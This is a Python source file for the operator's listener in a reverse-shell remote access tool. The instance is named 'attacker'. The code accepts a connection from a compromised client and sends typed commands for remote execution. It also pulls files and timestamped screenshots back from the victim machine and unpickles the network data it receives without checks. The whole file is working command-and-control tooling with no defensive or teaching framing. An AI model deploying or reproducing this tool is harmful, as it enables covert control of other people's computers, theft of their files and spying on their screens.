import socket
import random,os,pickle
from datetime import datetime

class Listener:

    def __init__(self,ip,port):

        # setting up
        self.s = socket.socket()
        self.s.bind((ip,port))
        self.s.listen(3)
        print("[+] Listener Started. Waiting for connection..")

        # receiving connection
        self.c,self.addr = self.s.accept()
        print("[+] Received Conneciton from client: %s"% str(self.addr[0]) + str(self.addr[1]))
        self.c.send("Connection established from server".encode('utf-8'))

    def reliable_send(self,command):
        self.c.sendall(pickle.dumps(command))
        
    def reliable_recv(self):

        recv_data = b''
        while True:
            try:
                recv_data += self.c.recv(1024)
                return pickle.loads(recv_data)
            except pickle.UnpicklingError:
                continue

    def execute_remotely(self,command):
        self.reliable_send(command)
        return self.reliable_recv()

    def run(self):
        while True:
            command = input("Enter Command:")

            # if exit command
            if command.lower() == 'exit':
                break
            elif command.startswith('c_download'):

                # will return the bytes of the file that has been sent.
                return_file = self.execute_remotely(command)
                filename = input("[+] Enter filename with extension: ")

                file_to_save = open(filename,'wb')

                file_to_save.write(return_file)
                file_to_save.close()
                print("[+] File successfully downloaded.")
            
            elif command.startswith('c_screenshot'):
                name_of_file = datetime.now().strftime("%d_%m_%y_%H_%M_%S") + '.png'


                return_file = self.execute_remotely(command)

                file_to_save = open(name_of_file,'wb')
                file_to_save.write(return_file)
                file_to_save.close()
                print('[+] Screenshot saved as %s' % name_of_file)

    
            else:
                # remotely execute the command  
                return_results = self.execute_remotely(command)
                print(return_results.decode('utf-8'))


attacker = Listener(ip = 'localhost',port = 8001)
attacker.run()

